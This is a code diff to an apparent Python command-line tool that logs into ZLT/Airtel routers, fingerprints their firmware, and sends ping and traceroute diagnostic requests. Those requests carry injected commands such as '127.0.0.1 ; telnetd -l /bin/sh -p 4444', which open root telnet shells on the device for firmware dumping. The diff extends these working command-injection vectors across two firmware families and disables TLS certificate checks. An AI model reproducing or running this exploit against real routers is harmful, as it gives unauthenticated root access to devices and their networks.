@@ -260,12 +260,12 @@ def web_login(
     username: str,
     password: str,
     timeout: float = 8.0,
-) -> Tuple[bool, str, str]:
+) -> Tuple[bool, str, str, str]:
     """
     POST login credentials to the router's CGI, capture the sessionId from
     the Set-Cookie header (or JSON body), and return it.
 
-    Returns: (success, session_id, error_message)
+    Returns: (success, session_id, endpoint_that_worked, error_message)
 
     The function tries multiple CGI paths and payload formats used across
     various ZLT / Airtel firmware revisions.
@@ -391,7 +391,7 @@ def web_login(
                 body = resp.read().decode("utf-8", errors="ignore")
                 sid  = _extract_sid(resp.headers, body)
                 if sid:
-                    return True, sid, ""
+                    return True, sid, url, ""
                 # Reached the server but no sid yet — record and keep trying
                 last_err = f"Endpoint {url} responded (HTTP {resp.status}) but no sessionId in response"
 
@@ -399,19 +399,19 @@ def web_login(
             err_body = e.read().decode("utf-8", errors="ignore")
             sid      = _extract_sid(e.headers, err_body)
             if sid:
-                return True, sid, ""
+                return True, sid, url, ""
             low = err_body.lower()
             if any(k in low for k in ("invalid", "incorrect", "wrong", "denied", "fail")):
-                return False, "", "Wrong username or password"
+                return False, "", "", "Wrong username or password"
             last_err = f"HTTP {e.code} from {url}"
             continue
         except urllib.error.URLError:
             # This endpoint doesn't exist on this router — try next
             continue
         except Exception as exc:
-            return False, "", str(exc)
+            return False, "", "", str(exc)
 
-    return False, "", last_err
+    return False, "", "", last_err
 
 
 def send_cgi_payload(
@@ -423,12 +423,34 @@ def send_cgi_payload(
 ) -> Tuple[bool, str]:
     """
     Sends a command payload (like ping diagnostic injection) to the router.
-    Tries both /cgi-bin/http.cgi and /goform paths depending on firmware.
+    Auto-detects format: if payload has "goformId", uses form-encoded goform path.
+    Otherwise uses JSON http.cgi path.
     """
     import urllib.parse
     
-    # Attempt 1: /cgi-bin/http.cgi with JSON (yocto_orca)
-    try:
+    ctx = ssl._create_unverified_context() if proto == "https" else None
+    
+    # ── goform path (M30/M60 firmware) ────────────────────────────────────────
+    if "goformId" in payload:
+        url = f"{proto}://{router_ip}/goform/goform_set_cmd_process"
+        data = urllib.parse.urlencode(payload).encode("utf-8")
+        headers = {
+            "Content-Type":     "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin":           f"{proto}://{router_ip}",
+            "Referer":          f"{proto}://{router_ip}/index.html",
+            "Cookie":           f"sessionId={session_id}",
+            "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        }
+        try:
+            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
+            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                return True, resp.read().decode("utf-8", errors="ignore")
+        except Exception as e:
+            return False, str(e)
+    
+    # ── http.cgi path (X25/X25A yocto_orca firmware) ──────────────────────────
+    else:
         url  = f"{proto}://{router_ip}/cgi-bin/http.cgi"
         data = json.dumps(payload).encode("utf-8")
         headers = {
@@ -439,36 +461,12 @@ def send_cgi_payload(
             "Cookie":           f"sessionId={session_id}",
             "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
         }
-        ctx = ssl._create_unverified_context() if proto == "https" else None
-        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
-        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
-            return True, resp.read().decode("utf-8", errors="ignore")
-    except Exception:
-        pass
-    
-    # Attempt 2: /goform/goform_set_cmd_process with form-encoded (newer ZLT)
-    try:
-        url = f"{proto}://{router_ip}/goform/goform_set_cmd_process"
-        # Extract meaningful fields from payload dict for goform
-        form_data = urllib.parse.urlencode({
-            "goformId":  "SET_WAN_DIAGNOSE",
-            "Type":      "ping",
-            "pingIpAddr": payload.get("ip", "127.0.0.1"),
-        }).encode("utf-8")
-        headers = {
-            "Content-Type":     "application/x-www-form-urlencoded",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin":           f"{proto}://{router_ip}",
-            "Referer":          f"{proto}://{router_ip}/index.html",
-            "Cookie":           f"sessionId={session_id}",
-            "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-        }
-        ctx = ssl._create_unverified_context() if proto == "https" else None
-        req = urllib.request.Request(url, data=form_data, headers=headers, method="POST")
-        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
-            return True, resp.read().decode("utf-8", errors="ignore")
-    except Exception as e:
-        return False, str(e)
+        try:
+            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
+            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                return True, resp.read().decode("utf-8", errors="ignore")
+        except Exception as e:
+            return False, str(e)
 
 
 def format_bytes(size: int) -> str:
@@ -492,6 +490,8 @@ class ZLTFirmwareDumperCLI:
         self.web_username = ""
         self.web_password = ""
         self.session_id   = ""
+        self.firmware_type = "unknown"  # Will be "goform" or "http.cgi" after login
+        self.login_endpoint = ""        # Stores which CGI path worked
         self.shell: Optional[RouterShellClient] = None
         self.partitions: List[Dict]             = []
         self.http_port    = 8088
@@ -579,17 +579,20 @@ class ZLTFirmwareDumperCLI:
                     )
                     return
 
-        # ── 2b. Collect credentials from the user (once) ──────────────────────
+        # ── 2b. Fingerprint firmware type first ───────────────────────────────
+        self._fingerprint_firmware()
+
+        # ── 2c. Collect credentials from the user (once) ──────────────────────
         console.print(
             Panel(
+                f"Detected firmware type: [bold cyan]{self._firmware_label()}[/bold cyan]\n\n"
                 "Enter the router admin credentials.\n"
                 "These are the same username and password you use to log in at\n"
                 f"[bold cyan]{self.proto}://{self.router_ip}[/bold cyan] in a browser.\n\n"
-                "Default credentials if you have not changed them:\n"
+                "Default credentials if unchanged:\n"
                 "  [bold]Username:[/bold] admin\n"
                 "  [bold]Password:[/bold] admin\n"
-                "\n[dim]Your credentials are used only to obtain a session cookie. "
-                "They are never stored.[/dim]",
+                "\n[dim]Credentials are used only to obtain a session token. Never stored.[/dim]",
                 title="[bold cyan]Router Credentials[/bold cyan]",
                 border_style="cyan",
                 padding=(1, 2),
@@ -607,49 +610,112 @@ class ZLTFirmwareDumperCLI:
             self.web_username = username
             self.web_password = password
 
-            # ── 2c. Perform headless web login ────────────────────────────────
+            # ── 2d. Perform headless web login ────────────────────────────────
             with console.status(
                 f"[cyan]Authenticating as [bold]{username}[/bold]...[/cyan]",
                 spinner="dots",
             ):
-                ok, sid, err = web_login(
+                ok, sid, endpoint, err = web_login(
                     self.proto, self.router_ip, username, password
                 )
 
             if ok:
-                self.session_id = sid
+                self.session_id     = sid
+                self.login_endpoint = endpoint
+                # Infer firmware type from which endpoint worked
+                if "goform" in endpoint:
+                    self.firmware_type = "goform"
+                elif "http.cgi" in endpoint:
+                    self.firmware_type = "http.cgi"
+                else:
+                    self.firmware_type = "other"
+
                 console.print(
-                    f"  [green]✔[/green] Login successful — sessionId obtained: "
-                    f"[bold magenta]{sid[:14]}…[/bold magenta]\n"
+                    f"  [green]✔[/green] Login OK — "
+                    f"[bold cyan]{self._firmware_label()}[/bold cyan] firmware detected\n"
+                    f"  [green]✔[/green] sessionId: [bold magenta]{sid[:16]}…[/bold magenta]\n"
                 )
                 return
 
-            # Decide if we can retry or give up
             if "Wrong username" in err or "password" in err.lower():
-                console.print(f"  [red]✘  {err}  —  try again.[/red]")
+                console.print(f"  [red]✘  {err}  — try again.[/red]")
                 continue
 
-            # Firmware did not return a sessionId through any known path.
-            # Offer the user a manual fallback just in case.
+            # No sessionId from any path — offer manual fallback
             console.print(
                 Panel(
-                    f"[yellow]Login reached the router but no sessionId was returned.[/yellow]\n\n"
-                    f"Error detail: {err}\n\n"
-                    "This can happen on very old firmware that stores the session\n"
-                    "differently.  You can paste a sessionId grabbed manually from\n"
-                    "Chrome/Safari Developer Tools, or press Enter to attempt the\n"
-                    "injection step with an empty session (fallback Telnet ports only).",
+                    f"[yellow]Reached the router but no sessionId was returned.[/yellow]\n\n"
+                    f"Detail: {err}\n\n"
+                    "Options:\n"
+                    "  1. Paste a sessionId grabbed from Chrome/Safari Dev Tools\n"
+                    "  2. Press Enter to attempt fallback Telnet ports only",
                     title="[yellow]Session Extraction Warning[/yellow]",
                     border_style="yellow",
                 )
             )
             manual = Prompt.ask(
-                "[dim]Paste sessionId manually, or press Enter to skip[/dim]", default=""
+                "[dim]Paste sessionId manually, or Enter to skip[/dim]", default=""
             ).strip()
             if manual:
                 m = re.search(r"sessionId=([A-Za-z0-9_\-]+)", manual)
                 self.session_id = m.group(1) if m else manual
             return
+
+    def _fingerprint_firmware(self) -> None:
+        """
+        Probes the router silently to detect firmware type before login.
+        Sets self.firmware_type to "goform", "http.cgi", or "unknown".
+        Shows a brief detection line to the user.
+        """
+        ctx = ssl._create_unverified_context() if self.proto == "https" else None
+
+        # Check for goform endpoint (ZLT M30, M60, MiFi variants)
+        goform_url = f"{self.proto}://{self.router_ip}/goform/goform_get_cmd_process?isTest=false&cmd=modem_main_state"
+        try:
+            req = urllib.request.Request(goform_url, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
+                body = resp.read().decode("utf-8", errors="ignore")
+                if resp.status == 200 or "modem" in body.lower() or "{" in body:
+                    self.firmware_type = "goform"
+                    console.print(
+                        f"  [cyan]⊙[/cyan] Firmware detected: [bold]ZLT goform[/bold] "
+                        f"(M30 / M60 / MiFi series)\n"
+                    )
+                    return
+        except Exception:
+            pass
+
+        # Check for http.cgi endpoint (ZLT X25, X25A — yocto_orca)
+        cgi_url = f"{self.proto}://{self.router_ip}/cgi-bin/http.cgi"
+        try:
+            data = json.dumps({"cmd": 0, "method": "GET", "language": "EN"}).encode()
+            req  = urllib.request.Request(
+                cgi_url, data=data,
+                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
+                method="POST",
+            )
+            with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
+                if resp.status in (200, 400, 401):
+                    self.firmware_type = "http.cgi"
+                    console.print(
+                        f"  [cyan]⊙[/cyan] Firmware detected: [bold]ZLT http.cgi[/bold] "
+                        f"(X25 / X25A — yocto_orca)\n"
+                    )
+                    return
+        except Exception:
+            pass
+
+        console.print(
+            f"  [yellow]⊙[/yellow] Firmware type unknown — will probe all login methods.\n"
+        )
+
+    def _firmware_label(self) -> str:
+        return {
+            "goform":   "ZLT M30/M60 (goform CGI)",
+            "http.cgi": "ZLT X25/X25A (yocto_orca http.cgi)",
+            "other":    "Unknown ZLT variant",
+            "unknown":  "Unknown (probing all methods)",
+        }.get(self.firmware_type, "Unknown")
 
     # --------------------------------------------------------------------------
     # STEP 3 — SHELL INJECTION
@@ -662,49 +728,15 @@ class ZLTFirmwareDumperCLI:
         console.print(Rule("[bold bright_blue]Step 3 of 5  ·  Root Shell Activation (Method A)[/bold bright_blue]"))
 
         while True:
-            # ── 3a. CGI injection vectors ─────────────────────────────────────
+            # ── 3a. Firmware-specific injection vectors ──────────────────────
             if self.session_id:
-                vectors = [
-                    (
-                        "Ping inject → /bin/sh on :4444",
-                        4444,
-                        {
-                            "enabled":   "1",
-                            "ip":        "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
-                            "cmd":       172,
-                            "method":    "POST",
-                            "subcmd":    6,
-                            "language":  "EN",
-                            "sessionId": self.session_id,
-                        },
-                    ),
-                    (
-                        "Ping inject → /bin/ash on :4445",
-                        4445,
-                        {
-                            "enabled":   "1",
-                            "ip":        "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
-                            "cmd":       172,
-                            "method":    "POST",
-                            "subcmd":    6,
-                            "language":  "EN",
-                            "sessionId": self.session_id,
-                        },
-                    ),
-                    (
-                        "Telnetd inject → :23",
-                        23,
-                        {
-                            "enabled":   "1",
-                            "ip":        f"{self.router_ip} ; telnetd -l /bin/sh",
-                            "cmd":       172,
-                            "method":    "POST",
-                            "subcmd":    6,
-                            "language":  "EN",
-                            "sessionId": self.session_id,
-                        },
-                    ),
-                ]
+                if self.firmware_type == "goform":
+                    vectors = self._get_goform_injection_vectors()
+                elif self.firmware_type == "http.cgi":
+                    vectors = self._get_httpcgi_injection_vectors()
+                else:
+                    # Unknown — try both sets
+                    vectors = self._get_httpcgi_injection_vectors() + self._get_goform_injection_vectors()
 
                 for desc, port, payload in vectors:
                     with console.status(f"[cyan]{desc}...[/cyan]", spinner="dots"):
@@ -733,8 +765,8 @@ class ZLTFirmwareDumperCLI:
                     "[red]Could not open a root shell.[/red]\n\n"
                     "Likely causes:\n"
                     "  • Session expired between login and injection (router is fast).\n"
-                    "  • This firmware revision patched cmd:172.\n"
-                    "  • WAN/ping diagnostics are disabled in the admin UI.",
+                    "  • This firmware revision patched the diagnostic injection.\n"
+                    "  • WAN/ping diagnostics disabled in admin UI.",
                     title="[red]Shell Activation Failed[/red]", border_style="red",
                 )
             )
@@ -757,15 +789,92 @@ class ZLTFirmwareDumperCLI:
             else:
                 # Re-login to get a fresh session, then loop
                 with console.status("[cyan]Re-authenticating...[/cyan]"):
-                    ok, sid, err = web_login(
+                    ok, sid, endpoint, err = web_login(
                         self.proto, self.router_ip,
                         self.web_username, self.web_password,
                     )
                 if ok:
-                    self.session_id = sid
+                    self.session_id     = sid
+                    self.login_endpoint = endpoint
                     console.print(f"  [green]✔[/green] Fresh sessionId obtained.")
                 else:
                     console.print(f"  [red]✘  Re-login failed: {err}[/red]")
+
+    def _get_httpcgi_injection_vectors(self):
+        """ZLT X25 / X25A (yocto_orca) — JSON-based http.cgi diagnostics."""
+        return [
+            (
+                "http.cgi ping inject → /bin/sh :4444",
+                4444,
+                {
+                    "enabled":   "1",
+                    "ip":        "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
+                    "cmd":       172,
+                    "method":    "POST",
+                    "subcmd":    6,
+                    "language":  "EN",
+                    "sessionId": self.session_id,
+                },
+            ),
+            (
+                "http.cgi ping inject → /bin/ash :4445",
+                4445,
+                {
+                    "enabled":   "1",
+                    "ip":        "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
+                    "cmd":       172,
+                    "method":    "POST",
+                    "subcmd":    6,
+                    "language":  "EN",
+                    "sessionId": self.session_id,
+                },
+            ),
+            (
+                "http.cgi telnetd inject → :23",
+                23,
+                {
+                    "enabled":   "1",
+                    "ip":        f"{self.router_ip} ; telnetd -l /bin/sh",
+                    "cmd":       172,
+                    "method":    "POST",
+                    "subcmd":    6,
+                    "language":  "EN",
+                    "sessionId": self.session_id,
+                },
+            ),
+        ]
+
+    def _get_goform_injection_vectors(self):
+        """ZLT M30 / M60 / MiFi — goform-based ping diagnostic injection."""
+        return [
+            (
+                "goform ping inject → /bin/sh :4444",
+                4444,
+                {
+                    "goformId":   "SET_WAN_DIAGNOSE",
+                    "Type":       "ping",
+                    "pingIpAddr": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
+                },
+            ),
+            (
+                "goform ping inject → /bin/ash :4445",
+                4445,
+                {
+                    "goformId":   "SET_WAN_DIAGNOSE",
+                    "Type":       "ping",
+                    "pingIpAddr": "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
+                },
+            ),
+            (
+                "goform traceroute inject → :23",
+                23,
+                {
+                    "goformId":         "SET_WAN_DIAGNOSE",
+                    "Type":             "traceroute",
+                    "traceRouteIpAddr": "127.0.0.1 ; telnetd -l /bin/sh",
+                },
+            ),
+        ]
 
     def _print_system_banner(self) -> None:
         if not self.shell:
